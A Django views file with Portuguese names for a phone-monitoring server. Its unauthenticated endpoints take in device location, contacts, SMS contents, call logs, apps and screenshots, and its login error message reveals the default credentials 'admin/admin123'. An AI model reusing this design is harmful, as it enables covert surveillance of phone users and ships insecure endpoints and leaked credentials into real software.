import csv
import re
import json
import os
from django.http import HttpResponse, JsonResponse
from django.shortcuts import render, redirect, get_object_or_404
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods
from django.core.files.storage import default_storage
from django.core.files.base import ContentFile
from .models import Dispositivo, Atividade, Localizacao, Contato, SMS, Chamada, Aplicativo, Arquivo, Midia, RedeSocial, AtividadeRede
from django.contrib.auth.decorators import login_required
from django.contrib.auth import authenticate, login, logout
from datetime import datetime, timedelta
from django.utils import timezone
from functools import wraps


@login_required
def cadastrar_dispositivo(request):
	if request.method == 'POST':
		imei = limpar_imei(request.POST.get('imei', ''))
		ip = request.POST.get('ip')
		nome = request.POST.get('nome')
		usuario = request.POST.get('usuario')
		modelo = request.POST.get('modelo')
		departamento = request.POST.get('departamento')
		sistema_operacional = request.POST.get('sistema_operacional')
		status = request.POST.get('status')
		data_aquisicao = request.POST.get('data_aquisicao')
		Dispositivo.objects.create(
			imei=imei,
			ip=ip,
			nome=nome,
			usuario=usuario,
			modelo=modelo,
			departamento=departamento,
			sistema_operacional=sistema_operacional,
			status=status,
			data_aquisicao=data_aquisicao
		)
		return redirect('lista_dispositivos')
	return render(request, 'monitoramento/cadastrar_dispositivo.html')

@login_required
def editar_dispositivo(request, imei):
	dispositivo = get_object_or_404(Dispositivo, imei=imei)
	if request.method == 'POST':
		dispositivo.ip = request.POST.get('ip')
		dispositivo.nome = request.POST.get('nome')
		dispositivo.usuario = request.POST.get('usuario')
		dispositivo.modelo = request.POST.get('modelo')
		dispositivo.departamento = request.POST.get('departamento')
		dispositivo.sistema_operacional = request.POST.get('sistema_operacional')
		dispositivo.status = request.POST.get('status')
		dispositivo.data_aquisicao = request.POST.get('data_aquisicao')
		novo_imei = request.POST.get('imei')
		if novo_imei and novo_imei != dispositivo.imei:
			dispositivo.imei = novo_imei.strip().replace(' ', '').replace('/', '')
		dispositivo.save()
		return redirect('lista_dispositivos')
	return render(request, 'monitoramento/editar_dispositivo.html', {'dispositivo': dispositivo})

@login_required
def excluir_dispositivo(request, imei):
	dispositivo = get_object_or_404(Dispositivo, imei=imei)
	if request.method == 'POST':
		dispositivo.delete()
		return redirect('lista_dispositivos')
	return render(request, 'monitoramento/excluir_dispositivo.html', {'dispositivo': dispositivo})


@login_required
def logs_dispositivos(request):
	dispositivos = Dispositivo.objects.all().prefetch_related('atividades')
	return render(request, 'monitoramento/logs.html', {'dispositivos': dispositivos})

@csrf_exempt
def login_view(request):
	if request.method == 'POST':
		username = request.POST.get('username')
		password = request.POST.get('password')

		user = authenticate(request, username=username, password=password)
		if user is not None:
			login(request, user)
			return redirect('lista_dispositivos')
		else:
			return render(request, 'monitoramento/login.html', {
				'erro': 'Usuário ou senha inválidos. Tente: admin/admin123'
			})
	return render(request, 'monitoramento/login.html')

def logout_view(request):
	logout(request)
	return redirect('login')

def limpar_imei(imei):
	# Remove todos os caracteres não numéricos e espaços
	return re.sub(r'[^0-9]', '', str(imei))

@login_required
def lista_dispositivos(request):
	from django.core.paginator import Paginator
	# Filtrar apenas dispositivos reais (com IMEI válido e dados coletados)
	dispositivos = Dispositivo.objects.exclude(imei__isnull=True).exclude(imei='').order_by('-ultima_conexao')
	imei = request.GET.get('imei', '').strip()
	ip = request.GET.get('ip', '').strip()
	usuario = request.GET.get('usuario', '').strip()
	departamento = request.GET.get('departamento', '').strip()
	status = request.GET.get('status', '').strip()

	if imei:
		dispositivos = dispositivos.filter(imei__icontains=imei)
	if ip:
		dispositivos = dispositivos.filter(ip__icontains=ip)
	if usuario:
		dispositivos = dispositivos.filter(usuario__icontains=usuario)
	if departamento:
		dispositivos = dispositivos.filter(departamento__icontains=departamento)
	if status:
		dispositivos = dispositivos.filter(status__icontains=status)

	paginator = Paginator(dispositivos, 10)  # 10 por página
	page_number = request.GET.get('page')
	page_obj = paginator.get_page(page_number)

	return render(request, 'monitoramento/lista_dispositivos.html', {
		'dispositivos': page_obj.object_list,
		'page_obj': page_obj,
		'request': request
	})
@login_required
def exportar_dispositivos_csv(request):
	dispositivos = Dispositivo.objects.all()
	imei = request.GET.get('imei', '').strip()
	ip = request.GET.get('ip', '').strip()
	usuario = request.GET.get('usuario', '').strip()
	departamento = request.GET.get('departamento', '').strip()
	status = request.GET.get('status', '').strip()

	if imei:
		dispositivos = dispositivos.filter(imei__icontains=imei)
	if ip:
		dispositivos = dispositivos.filter(ip__icontains=ip)
	if usuario:
		dispositivos = dispositivos.filter(usuario__icontains=usuario)
	if departamento:
		dispositivos = dispositivos.filter(departamento__icontains=departamento)
	if status:
		dispositivos = dispositivos.filter(status__icontains=status)

	response = HttpResponse(content_type='text/csv')
	response['Content-Disposition'] = 'attachment; filename="dispositivos.csv"'
	writer = csv.writer(response)
	writer.writerow(['IMEI', 'IP', 'Gateway', 'Máscara de rede', 'Nome', 'Usuário', 'Modelo', 'Departamento', 'Sistema Operacional', 'Status', 'Data de Aquisição', 'Data de Cadastro'])
	for d in dispositivos:
		writer.writerow([
			d.imei, d.ip, d.gateway, d.mascara_rede, d.nome, d.usuario, d.modelo, d.departamento,
			d.sistema_operacional, d.status, d.data_aquisicao, d.criado_em
		])
	return response

@csrf_exempt
@require_http_methods(["POST"])
def registrar_atividade(request):
	try:
		data = json.loads(request.body)
		imei = data.get('imei', 'dispositivo_desconhecido')
		descricao = data.get('descricao', 'Atividade automática')

		print(f"[API ATIVIDADE] Dados recebidos: IMEI={imei}, Descrição={descricao}")

		# Buscar dispositivo existente ou criar novo
		dispositivo = Dispositivo.objects.filter(imei=imei).first()
		if not dispositivo:
			dispositivo = Dispositivo.objects.create(
				imei=imei,
				ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
			)

		Atividade.objects.create(dispositivo=dispositivo, descricao=descricao)

		print(f"[API ATIVIDADE] Atividade salva para dispositivo {imei}")
		return JsonResponse({'status': 'success'})
	except Exception as e:
		print(f"[API ATIVIDADE] Erro: {str(e)}")
		return JsonResponse({'error': str(e)}, status=400)

@login_required
def atividades_dispositivo(request, imei):
	dispositivo = get_object_or_404(Dispositivo, imei=imei)
	atividades = dispositivo.atividades.all()
	return render(request, 'monitoramento/atividades_dispositivo.html', {'dispositivo': dispositivo, 'atividades': atividades})

@login_required
def registrar_atividade_form(request):
	dispositivos = Dispositivo.objects.all()
	if request.method == 'POST':
		imei = request.POST.get('imei')
		descricao = request.POST.get('descricao')
		dispositivo = get_object_or_404(Dispositivo, imei=imei)
		Atividade.objects.create(dispositivo=dispositivo, descricao=descricao)
		return redirect('todas_atividades')
	return render(request, 'monitoramento/registrar_atividade.html', {'dispositivos': dispositivos})

@login_required
def todas_atividades(request):
	atividades = Atividade.objects.select_related('dispositivo').order_by('-data_hora')
	return render(request, 'monitoramento/todas_atividades.html', {'atividades': atividades})

# APIs para receber dados dos dispositivos móveis
@csrf_exempt
@require_http_methods(["GET"])
def api_test(request):
    """Endpoint simples para testar conectividade"""
    return JsonResponse({'status': 'success', 'message': 'API funcionando'})

@csrf_exempt
@require_http_methods(["POST"])
def api_localizacao(request):
	try:
		data = json.loads(request.body)
		imei = data.get('imei', 'dispositivo_desconhecido')
		latitude = data.get('latitude')
		longitude = data.get('longitude')

		print(f"[API LOCALIZACAO] Dados recebidos: IMEI={imei}, Latitude={latitude}, Longitude={longitude}")

		# Buscar dispositivo existente ou criar novo
		dispositivo = Dispositivo.objects.filter(imei=imei).first()
		if not dispositivo:
			dispositivo = Dispositivo.objects.create(
				imei=imei,
				ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
			)

		# Salvar localização
		Localizacao.objects.create(
			dispositivo=dispositivo,
			latitude=latitude,
			longitude=longitude
		)

		print(f"[API LOCALIZACAO] Localização salva para dispositivo {imei}")
		return JsonResponse({'status': 'success'})
	except Exception as e:
		print(f"[API LOCALIZACAO] Erro: {str(e)}")
		return JsonResponse({'error': str(e)}, status=400)

@csrf_exempt
@require_http_methods(["POST"])
def api_contatos(request):
	try:
		data = json.loads(request.body)
		imei = data.get('imei', 'dispositivo_desconhecido')
		contatos = data.get('contatos', [])

		print(f"[API CONTATOS] Dados recebidos: IMEI={imei}, Contatos={len(contatos)}")

		# Buscar dispositivo existente ou criar novo
		dispositivo = Dispositivo.objects.filter(imei=imei).first()
		if not dispositivo:
			dispositivo = Dispositivo.objects.create(
				imei=imei,
				ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
			)

		for contato in contatos:
			Contato.objects.get_or_create(
				dispositivo=dispositivo,
				telefone=contato.get('telefone', ''),
				defaults={'nome': contato.get('nome', '')}
			)

		print(f"[API CONTATOS] Contatos salvos para dispositivo {imei}")
		return JsonResponse({'status': 'success'})
	except Exception as e:
		print(f"[API CONTATOS] Erro: {str(e)}")
		return JsonResponse({'error': str(e)}, status=400)

@csrf_exempt
@require_http_methods(["POST"])
def api_sms(request):
	try:
		data = json.loads(request.body)
		imei = data.get('imei', 'dispositivo_desconhecido')
		sms_list = data.get('sms', [])

		print(f"[API SMS] Dados recebidos: IMEI={imei}, SMS={len(sms_list)}")

		# Buscar dispositivo existente ou criar novo
		dispositivo = Dispositivo.objects.filter(imei=imei).first()
		if not dispositivo:
			dispositivo = Dispositivo.objects.create(
				imei=imei,
				ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
			)

		for sms in sms_list:
			SMS.objects.create(
				dispositivo=dispositivo,
				remetente=sms.get('remetente', ''),
				destinatario=sms.get('destinatario', ''),
				mensagem=sms.get('mensagem', ''),
				data_envio=timezone.now(),
				tipo=sms.get('tipo', 'recebido')
			)

		print(f"[API SMS] SMS salvos para dispositivo {imei}")
		return JsonResponse({'status': 'success'})
	except Exception as e:
		print(f"[API SMS] Erro: {str(e)}")
		return JsonResponse({'error': str(e)}, status=400)

@csrf_exempt
@require_http_methods(["POST"])
def api_chamadas(request):
	try:
		data = json.loads(request.body)
		imei = data.get('imei', 'dispositivo_desconhecido')
		chamadas = data.get('chamadas', [])

		print(f"[API CHAMADAS] Dados recebidos: IMEI={imei}, Chamadas={len(chamadas)}")

		# Buscar dispositivo existente ou criar novo
		dispositivo = Dispositivo.objects.filter(imei=imei).first()
		if not dispositivo:
			dispositivo = Dispositivo.objects.create(
				imei=imei,
				ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
			)

		for chamada in chamadas:
			Chamada.objects.create(
				dispositivo=dispositivo,
				numero=chamada.get('numero', ''),
				tipo=chamada.get('tipo', 'entrada'),
				duracao=chamada.get('duracao', 0),
				data_chamada=timezone.now()
			)

		print(f"[API CHAMADAS] Chamadas salvas para dispositivo {imei}")
		return JsonResponse({'status': 'success'})
	except Exception as e:
		print(f"[API CHAMADAS] Erro: {str(e)}")
		return JsonResponse({'error': str(e)}, status=400)

@csrf_exempt
@require_http_methods(["POST"])
def api_apps(request):
	try:
		data = json.loads(request.body)
		imei = data.get('imei', 'dispositivo_desconhecido')
		apps = data.get('apps', [])

		print(f"[API APPS] Dados recebidos: IMEI={imei}, Apps={len(apps)}")

		# Buscar dispositivo existente ou criar novo
		dispositivo = Dispositivo.objects.filter(imei=imei).first()
		if not dispositivo:
			dispositivo = Dispositivo.objects.create(
				imei=imei,
				ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
			)

		for app in apps:
			Aplicativo.objects.get_or_create(
				dispositivo=dispositivo,
				pacote=app.get('pacote', ''),
				defaults={
					'nome': app.get('nome', ''),
					'versao': app.get('versao', '')
				}
			)

		print(f"[API APPS] Apps salvas para dispositivo {imei}")
		return JsonResponse({'status': 'success'})
	except Exception as e:
		print(f"[API APPS] Erro: {str(e)}")
		return JsonResponse({'error': str(e)}, status=400)

@csrf_exempt
@require_http_methods(["POST"])
def api_upload(request):
	try:
		if 'screenshot' not in request.FILES:
			return JsonResponse({'error': 'Nenhum arquivo enviado'}, status=400)

		file = request.FILES['screenshot']
		imei = request.POST.get('imei', 'dispositivo_desconhecido')
		tipo = request.POST.get('tipo', 'screenshot')

		print(f"[API UPLOAD] Dados recebidos: IMEI={imei}, Arquivo={file.name}, Tipo={tipo}, Tamanho={file.size}")

		dispositivo, created = Dispositivo.objects.get_or_create(
			imei=imei,
			defaults={'ip': request.META.get('REMOTE_ADDR', '0.0.0.0')}
		)

		if tipo == 'screenshot':
			# Salvar como mídia do tipo screenshot
			Midia.objects.create(
				dispositivo=dispositivo,
				nome_arquivo=file.name,
				tipo_midia='screenshot',
				tamanho=file.size,
				arquivo=file
			)
		else:
			Arquivo.objects.create(
				dispositivo=dispositivo,
				nome_arquivo=file.name,
				caminho=f'/uploads/{file.name}',
				tamanho=file.size,
				tipo_arquivo=file.content_type or 'unknown',
				arquivo=file
			)

		print(f"[API UPLOAD] Arquivo salvo para dispositivo {imei}")
		return JsonResponse({'status': 'success'})
	except Exception as e:
		print(f"[API UPLOAD] Erro: {str(e)}")
		return JsonResponse({'error': str(e)}, status=400)

@csrf_exempt
@require_http_methods(["POST"])
def api_redes_sociais(request):
	try:
		data = json.loads(request.body)
		imei = data.get('imei', 'dispositivo_desconhecido')
		social_data = data.get('social_data', {})

		print(f"[API REDES SOCIAIS] Dados recebidos: IMEI={imei}, Apps Sociais={len(social_data.get('social_apps', []))}")

		# Buscar dispositivo existente ou criar novo
		dispositivo = Dispositivo.objects.filter(imei=imei).first()
		if not dispositivo:
			dispositivo = Dispositivo.objects.create(
				imei=imei,
				ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
			)

		for app in social_data.get('social_apps', []):
			RedeSocial.objects.get_or_create(
				dispositivo=dispositivo,
				pacote=app.get('package', ''),
				defaults={
					'nome_app': app.get('name', ''),
					'instalado': app.get('installed', True)
				}
			)

		print(f"[API REDES SOCIAIS] Redes sociais salvas para dispositivo {imei}")
		return JsonResponse({'status': 'success'})
	except Exception as e:
		print(f"[API REDES SOCIAIS] Erro: {str(e)}")
		return JsonResponse({'error': str(e)}, status=400)

@csrf_exempt
@require_http_methods(["POST"])
def api_atividade_rede(request):
	try:
		data = json.loads(request.body)
		imei = data.get('imei', 'dispositivo_desconhecido')
		ip_local = data.get('ip')
		wifi_status = data.get('wifi_status', '')

		print(f"[API ATIVIDADE REDE] Dados recebidos: IMEI={imei}, IP={ip_local}, WiFi={wifi_status}")

		# Buscar dispositivo existente ou criar novo
		dispositivo = Dispositivo.objects.filter(imei=imei).first()
		if not dispositivo:
			dispositivo = Dispositivo.objects.create(
				imei=imei,
				ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
			)

		AtividadeRede.objects.create(
			dispositivo=dispositivo,
			ip_local=ip_local or '0.0.0.0',
			ip_publico=request.META.get('REMOTE_ADDR'),
			wifi_status=wifi_status
		)

		print(f"[API ATIVIDADE REDE] Atividade de rede salva para dispositivo {imei}")
		return JsonResponse({'status': 'success'})
	except Exception as e:
		print(f"[API ATIVIDADE REDE] Erro: {str(e)}")
		return JsonResponse({'error': str(e)}, status=400)

@csrf_exempt
@require_http_methods(["POST"])
def api_device_info(request):
	try:
		data = json.loads(request.body)
		imei = data.get('imei', 'dispositivo_desconhecido')
		device_info = data.get('device_info', {})

		print(f"[API DEVICE INFO] Dados recebidos: IMEI={imei}, Device Info={device_info}")

		# Buscar dispositivo existente ou criar novo
		dispositivo = Dispositivo.objects.filter(imei=imei).first()
		if not dispositivo:
			dispositivo = Dispositivo.objects.create(
				imei=imei,
				ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
			)

		# Atualizar informações do dispositivo
		if 'bateria_nivel' in device_info:
			dispositivo.bateria_nivel = device_info['bateria_nivel']
		if 'bateria_carregando' in device_info:
			dispositivo.bateria_carregando = device_info['bateria_carregando']
		if 'bateria_temperatura' in device_info:
			dispositivo.bateria_temperatura = device_info['bateria_temperatura']
		if 'armazenamento_total' in device_info:
			dispositivo.armazenamento_total = device_info['armazenamento_total']
		if 'armazenamento_usado' in device_info:
			dispositivo.armazenamento_usado = device_info['armazenamento_usado']
		if 'armazenamento_livre' in device_info:
			dispositivo.armazenamento_livre = device_info['armazenamento_livre']

		dispositivo.save()

		print(f"[API DEVICE INFO] Informações do dispositivo atualizadas para {imei}")
		return JsonResponse({'status': 'success'})
	except Exception as e:
		print(f"[API DEVICE INFO] Erro: {str(e)}")
		return JsonResponse({'error': str(e)}, status=400)

# Views para exibir dados coletados
@login_required
def detalhes_dispositivo(request, imei):
	dispositivo = get_object_or_404(Dispositivo, imei=imei)
	localizacoes = dispositivo.localizacoes.order_by('-data_hora')[:10]
	contatos = dispositivo.contatos.all()
	sms = dispositivo.sms.order_by('-data_coleta')[:20]
	chamadas = dispositivo.chamadas.order_by('-data_coleta')[:20]
	aplicativos = dispositivo.aplicativos.all()
	arquivos = dispositivo.arquivos.order_by('-data_upload')[:10]
	midias = dispositivo.midias.order_by('-data_upload')[:20]
	redes_sociais = dispositivo.redes_sociais.all()
	atividades_rede = dispositivo.atividades_rede.order_by('-data_coleta')[:10]
	
	context = {
		'dispositivo': dispositivo,
		'localizacoes': localizacoes,
		'contatos': contatos,
		'sms': sms,
		'chamadas': chamadas,
		'aplicativos': aplicativos,
		'arquivos': arquivos,
		'midias': midias,
		'redes_sociais': redes_sociais,
		'atividades_rede': atividades_rede
	}
	return render(request, 'monitoramento/detalhes_dispositivo.html', context)

@login_required
def mapa_localizacoes(request, imei):
	dispositivo = get_object_or_404(Dispositivo, imei=imei)
	localizacoes = dispositivo.localizacoes.order_by('-data_hora')
	return render(request, 'monitoramento/mapa_localizacoes.html', {
		'dispositivo': dispositivo,
		'localizacoes': localizacoes
	})

@login_required
def gerar_relatorio_pdf(request, imei):
    from .utils import gerar_relatorio_pdf_response
    dispositivo = get_object_or_404(Dispositivo, imei=imei)
    return gerar_relatorio_pdf_response(dispositivo)

